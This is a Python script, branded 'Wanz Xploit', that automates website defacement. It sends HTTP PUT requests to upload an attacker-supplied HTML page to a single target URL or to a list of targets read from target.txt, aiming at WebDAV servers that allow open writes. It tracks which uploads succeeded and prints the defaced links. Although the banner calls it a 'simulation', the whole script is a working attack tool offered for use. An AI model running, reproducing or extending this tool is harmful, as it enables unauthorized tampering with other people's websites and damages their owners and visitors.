import os
import requests
from requests.exceptions import RequestException
from rich.console import Console
from rich.table import Table
from rich.progress import track
import signal

console = Console()
success_links = []

def show_banner():
    os.system("clear")  
    banner = """
[bold red] ████████╗   ██████╗ ███████╗███████╗
 ╚══██╔══╝   ██╔══██╗██╔════╝██╔════╝
    ██║█████╗██║  ██║█████╗  █████╗  
    ██║╚════╝██║  ██║██╔══╝  ██╔══╝  
    ██║      ██████╔╝███████╗██║     
    ╚═╝      ╚═════╝ ╚══════╝╚═╝     
                                    
[/bold red]
"""
    console.print(banner, justify="left")


def upload_file(target, file_path):
    try:
        with open(file_path, 'rb') as f:
            headers = {'Content-Type': 'application/octet-stream'}
            response = requests.put(target, data=f, headers=headers, timeout=10)
        if response.status_code in [200, 201]:
            return target
        else:
            return "Failed"
    except RequestException:
        return "Failed"


def read_targets():
    try:
        with open("target.txt", "r") as file:
            targets = file.readlines()
        return list(set([target.strip() for target in targets if target.strip()]))
    except FileNotFoundError:
        console.print("[bold red]File target.txt not found![/bold red]")
        exit(1)


def deface_single(target, file_path):
    table = Table(title="[bold red]Single Deface Results[/bold red]")
    table.add_column("No.", justify="center", style="bold yellow")
    table.add_column("Target URL", style="bold white")
    table.add_column("Status", justify="center", style="bold green")

    result = upload_file(target, file_path)
    if result != "Failed":
        table.add_row("1", result, "[bold green]Sukses[/bold green]")
        success_links.append(result)  
    else:
        table.add_row("1", target, "[bold red]Failed[/bold red]")

    show_banner()
    console.print("[bold yellow]Simulasi Deface: cURL Webdav Automation Tool[/bold yellow]", justify="center")
    console.print("[bold yellow]Powered by Wanz Xploit[/bold yellow]", justify="center")
    console.print("\n\n") 
    console.print(table)


def deface_multi(targets, file_path):
    table = Table(title="[bold red]Multi Deface Results[/bold red]")
    table.add_column("No.", justify="center", style="bold yellow")
    table.add_column("Target URL", style="bold white")
    table.add_column("Status", justify="center", style="bold green")

    for idx, target in enumerate(track(targets, description="[bold yellow]Defacing...[/bold yellow]"), start=1):
        result = upload_file(target, file_path)
        if result != "Failed":
            table.add_row(str(idx), result, "[bold green]Sukses[/bold green]")
            success_links.append(result)  
        else:
            table.add_row(str(idx), target, "[bold red]Failed[/bold red]")
        show_banner()
        console.print("[bold yellow]Simulasi Deface: cURL Webdav Automation Tool[/bold yellow]", justify="center")
        console.print("[bold yellow]Powered by Wanz Xploit[/bold yellow]", justify="center")
        console.print("\n\n")  
        console.print(table)


def handler(sig, frame):
    if success_links:
        console.print("\n[bold green]Successfully defaced targets! Here are the links:[/bold green]")
        for link in success_links:
            console.print(f"[bold cyan]{link}[/bold cyan]")
    else:
        console.print("[bold red]No successful deface operations yet![/bold red]")
    exit(0)


signal.signal(signal.SIGINT, handler)


def main():
    show_banner()
    console.print("[bold yellow]Deface Options:[/bold yellow]")
    console.print("[1] Single Deface (Manual URL)")
    console.print("[2] Multi Deface (Target 2019)")
    choice = console.input("\n[bold yellow]Choose option [1/2]: [/bold yellow]")

    if choice == "1":
        target = console.input("[bold yellow]Enter target URL (complete): [/bold yellow]").strip()
        file_path = console.input("[bold yellow]Enter deface file path (HTML): [/bold yellow]").strip()

        if not target or not file_path:
            console.print("[bold red]Target URL or file path cannot be empty![/bold red]")
            return

        if not file_path.lower().endswith(('.html', '.htm')):
            console.print("[bold red]Only .html or .htm files are supported![/bold red]")
            return

        if not os.path.exists(file_path):
            console.print("[bold red]File not found! The file should be placed in the same directory as the tool script.[/bold red]")
            return

        # Single target deface logic
        deface_single(target, file_path)

    elif choice == "2":
        file_path = console.input("[bold yellow]Enter deface file path (HTML): [/bold yellow]").strip()

        if not file_path.lower().endswith(('.html', '.htm')):
            console.print("[bold red]Only .html or .htm files are supported![/bold red]")
            return

        if not os.path.exists(file_path):
            console.print("[bold red]File not found! The file should be placed in the same directory as the tool script.[/bold red]")
            return
        targets = read_targets()
        console.print(f"[bold yellow]Total targets:[/bold yellow] {len(targets)}")
        deface_multi(targets, file_path)

    else:
        console.print("[bold red]Invalid choice![/bold red]")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit(0)